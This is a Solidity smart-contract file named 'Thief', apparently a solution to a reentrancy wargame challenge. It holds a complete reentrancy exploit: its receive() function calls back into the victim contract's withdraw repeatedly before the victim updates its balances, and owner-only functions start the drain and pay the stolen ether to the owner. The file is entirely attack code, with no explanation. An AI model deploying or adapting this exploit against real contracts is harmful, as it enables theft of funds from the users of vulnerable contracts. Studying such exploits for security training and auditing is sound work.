// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IReentrance { 
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract Thief is Ownable {
    IReentrance _victimContract;

    constructor(address _victimAddress) public {
        _victimContract = IReentrance(_victimAddress);
    }

    function withdrawAllFromVictim(uint _amount) public onlyOwner {
        _victimContract.withdraw(_amount);
    }

    function collectTheMoney() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    // Reenter: Victim contract withdraw function will be called
    // before updating the account balance
    receive() external payable {
        _victimContract.withdraw(msg.value);
    }
}
